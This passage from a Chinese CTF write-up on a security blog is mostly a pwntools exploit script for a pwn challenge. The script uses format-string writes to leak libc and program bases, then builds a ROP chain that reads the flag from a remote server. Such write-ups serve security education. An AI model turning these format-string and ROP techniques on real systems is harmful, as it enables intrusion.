+        stack_low_2 = (stack_addr & 0xffff) >> 8
+        payload = '%'+str(stack_low-0x20)+"c%6$hhn"
+    
+        sleep(0.02)
+        p.recvuntil("Come in quickly, I will close the door.\n")
+        p.sendline(payload)
+        payload = '%'+str(0xa90)+"c%10$hn"
+        sleep(0.02)
+        p.sendline(payload)
+    
+        #change the fileno position
+        #%29$p
+    
+        WriteVal(stack_low,-0x70,0x90,signle=True)
+        payload = "%"+str(2)+"c%29$hhn"
+        sleep(0.02)
+        p.sendline(payload)
+        #leak libc
+    
+        payload = "-%13$p+"
+        sleep(0.02)
+        p.sendline(payload)
+        print "got here"
+        p.recvuntil("-0x")
+        libc_base = int(p.recvuntil("+",drop=True),16) - 240 - libc.sym['__libc_start_main']
+        log.success("libc base => " + hex(libc_base))
+        libc.address = libc_base
+        #
+        payload = "-%p+"
+        sleep(0.02)
+        p.sendline(payload)
+        p.recvuntil("0x")
+    
+        proc_base = int(p.recvuntil("+",drop=True),16) - (0x5616ed121b04+0x540-0x00005616ecf20000)
+        log.success("proc base => " + hex(proc_base))
+        raw_input()
+    
+        p_rsp_r3 = proc_base + 0x000000000000104d
+        gdb.attach(p,'b printf')
+        WriteVal(stack_low,-0x100,p_rsp_r3&0xff,signle=True)
+        WriteVal(stack_low,-0x100+1,(p_rsp_r3&0xffff)>>8,signle=True)
+        WriteVal(stack_low,-0x100+2,(p_rsp_r3&0xffffff)>>16,signle=True)
+    
+        #write bss addr to stack
+        target = proc_base + 0x202040
+        WriteVal(stack_low,-0xf8,target&0xff,signle=True)
+        WriteVal(stack_low,-0xf8+1,(target&0xffff)>>8,signle=True)
+    
+        WriteVal(stack_low,-0xf8+2,(target&0xffffff)>>16,signle=True)
+        #write pop rsp to stack
+    #
+        p_rdi = libc_base + 0x0000000000021112
+        p_rsi = libc_base + 0x00000000000202f8
+        p_rdx = libc_base + 0x0000000000001b92
+        p_rax = libc_base + 0x000000000003a738
+        syscall = libc_base + 0x00000000000bc3f5
+        payload = "Ciscn20\x00"
+        payload += "./flag\x00\x00"*2
+        payload += flat([
+            p_rdi,target+0x8,p_rsi,0,p_rdx,0,p_rax,2,syscall,
+            p_rdi,1,p_rsi,target+0x200,p_rdx,0x30,p_rax,0,syscall,
+            p_rdi,2,p_rsi,target+0x200,p_rdx,0x30,p_rax,1,syscall
+            ])
+        sleep(0.02)
+        p.sendline(payload)
+    
+    
+    
+        return 1
+    #exp()
+    #p.interactive()
+    
+    while True:
+        if debug:
+            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+            p = process('./anti.bak')
+        else:
+            libc = ELF('./libc.so.6')
+            p = remote('183.129.189.62',58704)
+        a = 0
+        try:
+            a = exp()
+            if a == 0:
+                p.close()
+                continue
+            else:
+                p.interactive()
+                p.close()
+        except:
+            p.close()
+            continue
+    
+
+## 后言
+
+day2-pwn3这道题当时做的时候弹栈的方法没有想的很明白，劫持到了一个`sub
+rsp,0x10`的gadget，在随后的执行过程中stdout指针被新值覆写故放弃了这个思路，之后西湖论剑的初赛看到`fmyy`师傅分享的劫持到start函数的思路，遂复现了一遍，非常感觉师傅的分享。
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **xmzyshypnc** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/219140](/post/id/219140)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Pwn](/tag/Pwn)
+  * [CTF](/tag/CTF)
+
+ **+1** __7赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/qqapp/101430193/42C114A8F7E5085EE30477F9EB2359AE/40)
+xmzyshypnc
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
